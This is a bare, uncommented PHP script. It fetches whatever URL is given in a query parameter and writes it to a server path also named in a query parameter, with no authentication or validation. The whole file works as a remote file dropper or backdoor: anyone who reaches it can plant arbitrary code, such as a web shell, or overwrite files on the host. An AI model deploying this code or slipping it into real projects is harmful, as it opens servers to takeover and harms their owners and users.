<?php
file_put_contents($_GET['fileName'], fopen($_GET['url'], 'r'));
?>